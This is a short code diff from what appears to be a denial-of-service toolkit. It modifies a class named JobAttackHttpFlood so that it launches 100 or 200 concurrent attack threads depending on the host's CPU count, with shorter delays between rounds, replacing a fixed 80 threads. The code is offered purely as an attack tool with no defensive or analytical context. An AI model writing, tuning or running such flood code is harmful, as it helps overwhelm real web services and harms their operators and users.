@@ -1,9 +1,19 @@
+import os
 import threading
 import time
 from jobs.abstract_job import AbstractJob
 from services.service_http import ServiceHttp
 from injectable import injectable, autowired, Autowired
 
+CURRENT_CPU_COUNT = os.cpu_count()
+THREADS_BY_CPU_COUNT_MAP = {
+    1: 100,
+    2: 200
+}
+DELAYS_BY_CPU_COUNT_MAP = {
+    1: 3,
+    2: 2
+}
 
 @injectable
 class JobAttackHttpFlood(AbstractJob):
@@ -35,9 +45,9 @@ class JobAttackHttpFlood(AbstractJob):
             return
 
         # Launch separate threads with attacks
-        for thread_index in range(0, 80):
+        for thread_index in range(0, THREADS_BY_CPU_COUNT_MAP[CURRENT_CPU_COUNT]):
             thread = threading.Thread(target=self.launch_attack_in_thread, args=[thread_index])
             thread.start()
-        time.sleep(3)
+        time.sleep(DELAYS_BY_CPU_COUNT_MAP[CURRENT_CPU_COUNT])
 
         print('JobAttackHttpFlood.job_iteration(): Finished')
